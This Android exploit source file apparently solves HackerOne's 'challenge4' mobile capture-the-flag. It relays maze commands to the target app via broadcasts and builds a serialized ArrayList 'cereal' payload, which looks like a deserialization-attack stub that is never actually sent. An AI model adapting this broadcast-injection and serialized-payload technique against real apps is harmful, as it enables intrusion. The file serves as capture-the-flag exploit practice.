package com.challenge4_exploit;

import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import java.io.Serializable;
import java.util.ArrayList;

public class pwn {
    public static final String pwnTag = "FPASSWDPWN";

    public static void onReceive(Context context, Intent intent) {
        Log.d(pwn.pwnTag, "onReceive is called");
        Bundle extras = intent.getExtras();
        if (extras != null) {
            if (intent.hasExtra("move")) {
                Log.d(pwn.pwnTag, "move is received");
                String x = extras.getString("move");
                Character c = x.charAt(0);
                Log.d(pwn.pwnTag, "Move is " + String.valueOf(c));
                Intent moveIntent = new Intent();
                moveIntent.putExtra("move", c);
                moveIntent.setAction("com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER");
                context.sendBroadcast(moveIntent);
                Log.d(pwn.pwnTag, "move sent");
            }
            if (intent.hasExtra("start_game")) {
                Log.d(pwn.pwnTag, "start_game rececived");
                Intent startMaze = new Intent();
                startMaze.setAction("com.hackerone.mobile.challenge4.menu");
                startMaze.putExtra("start_game", "");
                context.sendBroadcast(startMaze);
                Log.d(pwn.pwnTag, "start_game sent");
            }
            if (intent.hasExtra("get_maze")) {
                Log.d(pwn.pwnTag, "get_maze received");
                Intent getMaze = new Intent();
                getMaze.setAction("com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER");
                getMaze.putExtra("get_maze", "");
                context.sendBroadcast(getMaze);
                Log.d(pwn.pwnTag, "get_maze sent");
            }
            if (intent.hasExtra("cereal") || intent.hasExtra("pwn")) {
                Log.d(pwn.pwnTag, "cereal received");
                Intent pwnshit = new Intent();
                pwnshit.setAction("com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER");
                Serializable payload = new ArrayList();
                ((ArrayList) payload).add(Integer.valueOf(1337));
                ((ArrayList) payload).add(Integer.valueOf(1338));
                ((ArrayList) payload).add(Integer.valueOf(1339));
                ((ArrayList) payload).add(Integer.valueOf(1340));

                pwnshit.putExtra("cereal", payload);
                Log.d(pwn.pwnTag, "cereal sent");
            }
        }
    }
}
